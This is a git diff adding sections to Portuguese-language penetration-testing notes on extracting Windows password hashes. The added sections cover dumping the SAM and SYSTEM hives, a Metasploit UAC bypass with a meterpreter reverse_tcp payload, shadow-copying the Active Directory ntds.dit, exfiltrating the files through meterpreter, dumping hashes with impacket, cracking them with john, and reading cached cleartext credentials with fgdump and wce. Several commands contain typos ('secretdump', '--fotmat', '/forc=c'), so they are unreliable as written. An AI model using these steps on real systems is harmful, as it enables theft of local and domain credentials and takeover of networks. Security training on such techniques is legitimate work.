@@ -66,6 +66,8 @@ rafaela:1005:aa...........................ee == vazio (significa que não está 
 Obs: ID = 500 - Corresponde a uma conta de administrador.
 
 
+
+
 ## Obtendo hashes: Sistemas Antigos
 
 `getuid` - Comando para saber qual o seu nivel de permissão.
@@ -109,6 +111,74 @@ Outra aplicação para extrair as hashs
 
 
 
+## Obtendo hashes: Sistemas Modernos
+
+Salvando registro sam na area de trabalho do windows
+
+- Execute o cmd como administrador
+- reg save hklm\sam sam10
+- reg save hklm\system system10
+
+Exploit para ByPass em UAC (User Local Acont)
+
+*Obs: Para utilizar este exlploit voce dever ja ter uma sessão aberta com o alvo.*
+
+- search uac
+- exploit(windows/local/ask)
+- Payload options (windows/meterpreter/reverse_tcp):
+
+*Obs: Para esse exploit ter sucesso tambem é preciso que o usuario da maquina alvo clique em sim na janela que irar abrir no alvo.*
+
+
+
+
+## Obtendo hashes: Servidores AD
+
+`C:\> cd windows`
+
+`C:\Windows> cd ntds`
+
+`C:\Windows\NTDS>dir`
+
+ntds.dit --> Arquivo que possui as credenciais do Active Director, so que o mesmo não pode ser acesso de forma direta, então sera necessario fazer os proximos passos para obtermos as informações contidas no arquivo.
+
+vssadmin - utilitario para criar uma copia sombra dos volumes que tem no windows.
+
+`C:\>vssadmin list volumes`
+
+`C:\>vssadmin create shadow /forc=c`
+
+`C:\>copy DADOS_DO_SHADOW_COPY_VOLUME_NAME\windows\ntds\ntds.dit c:\ntds.dit`
+
+`C:\>copy DADOS_DO_SHADOW_COPY_VOLUME_NAME\windows\system32\config\system c:\system12`
+
+`C:\>copy DADOS_DO_SHADOW_COPY_VOLUME_NAME\windows\system32\config\sam c:\sam12`
+
+`meterpreter > download sam12`
+
+`meterpreter > download system12`
+
+`meterpreter > download ntds.dit`
+
+`impacket-secretdump -sam sam12 -system system12 LOCAL`
+
+`impacket-secretdump -ntds ntds.dit -system system12 LOCAL`
+
+**Descobrindo hashes **
+
+`john --fotmat=lm hash.txt`
+
+Obtendo hashes e senhas em cache
+
+fgdump.exe --> Permite conseguir acessar informações que estão na cache, credenciais. 
+
+type arquivo.pwdump
+
+type arquivo.cachedump
+
+wce-universal.exe --> Ler informações de cache e exibe credenciais em texto claro.
+
+wce-universal.exe -w
 
 
 
